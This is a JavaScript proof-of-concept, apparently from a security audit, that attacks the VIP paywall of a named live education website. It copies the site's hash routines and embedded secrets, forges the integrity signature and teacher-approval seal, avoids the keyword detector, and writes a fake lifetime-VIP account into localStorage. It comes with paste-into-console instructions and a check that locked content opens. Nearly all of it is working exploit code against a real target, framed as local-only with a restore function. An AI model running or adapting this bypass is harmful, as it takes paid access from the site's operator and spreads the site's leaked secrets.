// poc_f03_vip_entitlement.js — F-03 / NEW-11 / NEW-12 / NEW-13 / NEW-14
//                                (ACTION — grants VIP locally and verifies the grant)
//
// Target:  https://trithuc500.vercel.app/
// Findings:
//   F-03    — VIP entitlement is decided entirely from client-owned fields.
//   NEW-11  — the V4.5 "teacher approval" seal is computed from secrets that
//             are literals in the same public bundle, so it is forgeable offline.
//   NEW-12  — the shipped boot normalizer (lines 2663-2666) AUTO-GRANTS a
//             valid `_adminVipSeal` to any record whose `_sig` matches.
//   NEW-13  — `detectAndBlockStudentVipHackV44` only matches substrings
//             (poc_vip|nologin|hack|exploit|bypass|cheat).
//   NEW-14  — ids `gv_test` / `stu_free_12b1` / `stu_practice_e`, or the
//             `isAdminTester` flag, skip the detector and the runtime
//             integrity check entirely.
//
// Type:     ACTION. Writes a synthetic account, then verifies that the shipped
//           gates actually grant access.
//
// SCOPE / SAFETY:
//   - LOCAL ONLY. Writes to this browser's localStorage. Does NOT publish to
//     ntfy.sh / keyvalue.immanuel.co. Does NOT touch any real account.
//   - Uses a synthetic identity with an ordinary-looking name, so nothing
//     real is impersonated.
//   - `__AERO_F03_RESTORE__()` reverts.
//
// Usage: paste into DevTools Console on the target page, then F5.

(() => {
    'use strict';

    const K_USERS = 'TRITHUC50_USERS_V436_CLEAN';
    const K_LOGIN = 'TRITHUC50_LOGGED_STUDENT_V436';
    const K_BACKUP = 'TRITHUC50_AERO_F03_BACKUP';

    // ---- 1. Reproduce the two shipped hash primitives exactly. -------------
    function hashStringHex(rawStr) {
        const str = String(rawStr || '');
        let h1 = 0x811c9dc5, h2 = 0x1b873593;
        for (let i = 0; i < str.length; i++) {
            const c = str.charCodeAt(i);
            h1 = Math.imul(h1 ^ c, 16777619);
            h2 = Math.imul(h2 ^ c, 2246822507);
        }
        const p1 = (h1 >>> 0).toString(16).toUpperCase().padStart(6, '0').slice(-4);
        const p2 = (h2 >>> 0).toString(16).toUpperCase().padStart(6, '0').slice(-4);
        return p1 + p2;
    }

    const INTEGRITY_SALT = 'TRITHUC50_SEC_SALT_2026_V27';   // bundle literal
    const SEAL_MASTER = 'THAY_TRUNG_MASTER_SEAL_2026';       // bundle literal
    // V4.5 replaced the plaintext vault password with this bundle-literal hash.
    const VAULT_ADMIN_PASS = 'h45_44e3396f901a954c_24f662274f7844f4'; // DEFAULT_VAULT_PASS_HASH_V45

    function computeUserIntegritySig(u) {
        if (!u) return '';
        const vp = u.vipPackages || {};
        const raw = `${u.id || ''}|${(u.username || '').toLowerCase()}|${u.status || ''}|${vp.k12 ? 1 : 0}${vp.k11 ? 1 : 0}${vp.k10 ? 1 : 0}${vp.luyende ? 1 : 0}|${u.vipPlan || 'none'}|${u.vipExpiresAt || 0}|${(u.gmail || '').toLowerCase()}|${u.maxDevices || 2}|${INTEGRITY_SALT}`;
        let h1 = 0xdeadbeef ^ raw.length, h2 = 0x41c6ce57 ^ raw.length;
        for (let i = 0; i < raw.length; i++) {
            const ch = raw.charCodeAt(i);
            h1 = Math.imul(h1 ^ ch, 2654435761);
            h2 = Math.imul(h2 ^ ch, 1597334677);
        }
        h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
        h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
        return 'v27_' + (h2 >>> 0).toString(16).padStart(8, '0') + (h1 >>> 0).toString(16).padStart(8, '0');
    }

    function computeTeacherVipApprovalSealV44(u) {
        if (!u) return '';
        const vp = u.vipPackages || {};
        const maxD = Math.max(1, Math.min(3, Number(u.maxDevices || 2)));
        const raw = `TT50_VIP_SEAL_V44|${String(u.username || '').toLowerCase()}|${String(u.name || '').trim()}|${String(u.class || '').trim()}|${vp.k12 ? 1 : 0}${vp.k11 ? 1 : 0}${vp.k10 ? 1 : 0}${vp.luyende ? 1 : 0}|MAXD:${maxD}|${VAULT_ADMIN_PASS}|${SEAL_MASTER}`;
        return 'vseal44_' + hashStringHex(raw);
    }

    // ---- 2. Build a synthetic account that passes the V4.5 heuristics. -----
    // NEW-13: avoid the keyword blacklist.
    // NEW-14: do NOT use the exempt ids, so the guard genuinely runs.
    const stamp = String(Date.now()).slice(-6);
    const NAME = 'nguyenvan' + stamp;
    const FULLNAME = 'Nguyen Van ' + stamp;
    const GMAIL = NAME + '@example.edu.vn';
    const NOW = Date.now();

    const synthetic = {
        id: 'stu_' + NAME,                 // ordinary id, not an exempt one
        username: NAME,
        password: 'SYNTHETIC_POC_ONLY',
        name: FULLNAME,
        class: '12A1',
        stt: '01',
        gmail: GMAIL,
        phone: '',
        status: 'active',
        vipPackages: { k12: true, k11: true, k10: true, luyende: true },
        requestedPackages: { k12: true, k11: true, k10: true, luyende: true },
        vipPlan: 'lifetime',
        requestedPlan: 'lifetime',
        vipExpiresAt: null,
        vipExpiredAt: null,
        vipRequestPending: false,
        isNewRegistration: false,
        isVip: true,
        maxDevices: 2,                      // inside the allowed 1..3
        trustedDevices: [],
        blockedDevicesLog: [],
        deviceShareViolations: 0,
        registeredAt: '01/01/2026',
        updatedAt: NOW,
        createdInV436: true
    };

    // NEW-11 / NEW-12: forge the integrity sig. The boot normalizer will mint
    // the seal itself, but we also set it so the record is valid immediately.
    synthetic._sig = computeUserIntegritySig(synthetic);
    synthetic._adminVipSeal = computeTeacherVipApprovalSealV44(synthetic);

    // ---- 3. Write the state. ---------------------------------------------
    if (localStorage.getItem(K_BACKUP)) {
        return console.warn('[F-03] already active. Run __AERO_F03_RESTORE__() first.');
    }
    const prevUsers = localStorage.getItem(K_USERS);
    const prevLogin = localStorage.getItem(K_LOGIN);
    localStorage.setItem(K_BACKUP, JSON.stringify({ users: prevUsers, login: prevLogin, at: NOW }));

    let users = [];
    try { users = JSON.parse(prevUsers || '[]'); } catch (e) { users = []; }
    if (!Array.isArray(users)) users = [];
    users = users.filter(u => String(u?.username || '').toLowerCase() !== NAME.toLowerCase());
    users.unshift(synthetic);
    localStorage.setItem(K_USERS, JSON.stringify(users));
    localStorage.setItem(K_LOGIN, JSON.stringify({ username: NAME }));

    console.table({
        username: NAME,
        name: FULLNAME,
        maxDevices: synthetic.maxDevices,
        vipPackages: Object.keys(synthetic.vipPackages).filter(k => synthetic.vipPackages[k]).join(','),
        vipPlan: synthetic.vipPlan,
        _sig: synthetic._sig,
        _adminVipSeal: synthetic._adminVipSeal,
        scope: 'LOCAL ONLY — no ntfy/KV publish'
    });

    // ---- 4. Action chain: verify the gates actually grant access. ---------
    // Runs after the reload so the app's own boot normalizer has run.
    window.__AERO_F03_VERIFY__ = function () {
        console.log('=== [F-03] VIP entitlement verification ===');
        const out = {};

        // 4a. Did the boot normalizer keep the account alive and grant a seal?
        const stored = JSON.parse(localStorage.getItem(K_USERS) || '[]');
        const me = stored.find(u => u.username === NAME);
        out.recordPresent = !!me;
        out.status = me ? me.status : null;
        out.isVip = me ? me.isVip === true : null;
        out.vipPlan = me ? me.vipPlan : null;
        out.sealPresent = !!(me && me._adminVipSeal);
        out.sigValid = !!(me && me._sig === computeUserIntegritySig(me));
        out.sealValid = !!(me && me._adminVipSeal === computeTeacherVipApprovalSealV44(me));
        console.table(out);

        // 4b. Does the logged-in student actually hold the session?
        const login = JSON.parse(localStorage.getItem(K_LOGIN) || 'null');
        out.loggedInAs = login ? login.username : null;
        out.sessionMatch = !!(login && me && login.username === me.username);

        // 4c. Is VIP content actually reachable in the UI?
        const bodyText = document.body.innerText || '';
        out.vipBadgeVisible = /Trọn đời|Vĩnh viễn|toàn bộ/i.test(bodyText);
        out.lockedModalVisible = /BẠN CHƯA MUA|KHÓA VIP|mở khóa VIP/i.test(bodyText);

        console.table(out);

        // 4d. Try to open a protected lesson, which is the real user-visible goal.
        try {
            const btn = Array.from(document.querySelectorAll('button, [onclick*="hasStudentVipAccess"]'))
                .find(b => b.offsetParent !== null && /khóa|lock|mở/i.test(b.textContent || ''));
            if (btn) {
                btn.click();
                out.actionClicked = (btn.textContent || '').trim().slice(0, 60);
                console.log('[F-03] clicked:', out.actionClicked);
            } else {
                out.actionClicked = '(no visible locked-content button found)';
            }
        } catch (e) { out.actionClicked = 'click failed: ' + e.message; }

        const verdict = (out.isVip && out.sigValid && out.sealValid && out.sessionMatch)
            ? 'F-03 CONFIRMED: forged account holds full VIP entitlement locally'
            : 'F-03 NOT CONFIRMED — inspect the table above';
        console.log('[F-03]', verdict);
        return { ...out, verdict };
    };

    setTimeout(() => { if (typeof window.__AERO_F03_VERIFY__ === 'function') window.__AERO_F03_VERIFY__(); }, 2500);

    window.__AERO_F03_RESTORE__ = function () {
        const b = localStorage.getItem(K_BACKUP);
        if (!b) return console.warn('[F-03] no backup found');
        const saved = JSON.parse(b);
        if (saved.users === null) localStorage.removeItem(K_USERS);
        else localStorage.setItem(K_USERS, saved.users);
        if (saved.login === null) localStorage.removeItem(K_LOGIN);
        else localStorage.setItem(K_LOGIN, saved.login);
        localStorage.removeItem(K_BACKUP);
        delete window.__AERO_F03_RESTORE__;
        delete window.__AERO_F03_VERIFY__;
        console.log('[F-03] original state restored. Press F5.');
        return true;
    };

    console.log('[F-03] synthetic VIP account written. Press F5 — verification runs automatically.');
    console.log('Restore: __AERO_F03_RESTORE__() then F5');

    return { ok: true, username: NAME, scope: 'LOCAL ONLY' };
})();
